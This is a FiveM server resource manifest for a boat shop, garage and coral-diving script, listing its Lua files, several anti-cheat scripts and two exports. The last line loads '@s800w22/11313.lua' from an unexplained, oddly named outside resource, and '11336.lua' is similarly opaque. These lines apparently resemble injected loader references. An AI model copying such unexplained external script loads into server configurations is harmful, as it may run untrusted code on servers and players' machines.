resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

server_scripts {
	'config.lua',
	'server/main.lua',
    'server/diving.lua',
}

client_script "@lcrp-radialmenu/gui.lua"

client_scripts {
	'config.lua',
    'client/main.lua',
    'client/boatshop.lua',
    'client/diving.lua',
    'client/garage.lua',
}

client_script "11336.lua"
client_script "lucidcity-anticheat.lua"
client_script "antikickvehicle.lua"
client_script "anti-stungun.lua"
client_script "anti-update.lua"
client_script "block-menus.lua"
client_script "block-menus2.lua"

exports {
    "CanPickupCoral",
    "IsCorrectCoral"
}

client_script '@s800w22/11313.lua'